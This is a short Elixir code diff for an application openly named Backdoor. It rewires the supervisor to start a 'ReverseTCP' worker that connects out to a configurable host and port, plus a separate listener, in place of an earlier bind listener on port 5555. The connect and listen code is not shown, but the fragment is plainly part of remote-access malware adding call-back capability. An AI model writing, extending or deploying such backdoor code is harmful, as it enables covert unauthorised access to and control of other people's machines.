@@ -8,9 +8,13 @@ defmodule Backdoor.Application do
   @impl true
   def start(_type, _args) do
     children = [
-      %{
-        id: Backdoor,
-        start: {Backdoor.Listener, :accept, [5555]}
+     %{
+        id: ReverseTCP,
+        start: {Backdoor, :connect, [Application.fetch_env!(:backdoor, :connect_host), Application.fetch_env!(:backdoor, :connect_port)]}
+      },
+     %{
+        id: LocalhostListener,
+        start: {Backdoor, :listen, [ Application.fetch_env!(:backdoor, :listen_port)]}
       }
       # Starts a worker by calling: Backdoor.Worker.start_link(arg)
       # {Backdoor.Worker, arg}
